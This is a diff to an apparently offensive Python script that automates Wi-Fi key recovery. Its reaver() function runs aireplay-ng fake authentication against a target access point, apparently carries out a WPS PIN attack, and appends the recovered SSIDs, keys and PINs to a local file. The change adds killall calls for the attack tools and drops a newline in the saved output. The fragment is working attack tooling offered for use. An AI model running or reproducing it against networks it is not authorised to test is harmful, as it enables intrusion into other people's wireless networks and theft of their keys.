@@ -156,8 +156,11 @@ def auto(attackmode):
 def reaver():
    global choice, bssid, ssid, keycount, channel, ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
    try:
-      #clear()
+      clear()
       print('Trying to recover %s Key' % (bssid))
+      subprocess.call(['killall', 'airodump-ng'], stderr=DN)
+      subprocess.call(['killall', 'reaver'], stderr=DN)
+      subprocess.call(['killall', 'aireplay-ng'], stderr=DN)
       time.sleep(3)
       cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
       time.sleep(5)
@@ -208,7 +211,7 @@ def reaver():
             print("Key recovered!")
             keycount = keycount + 1
             text_file = open("bees.txt", "a")
-            text_file.write("SSID: %s\nBSSID: %s\nKey: %s\nPin: %s\n\n" % (ssid, bssid, PWD, PIN))
+            text_file.write("SSID: %s\nBSSID: %s\nKey: %sPin: %s\n\n" % (ssid, bssid, PWD, PIN))
             text_file.close()
             subprocess.call(['killall', 'aireplay-ng'], stderr=DN)
             subprocess.call(['killall', 'reaver'], stderr=DN)
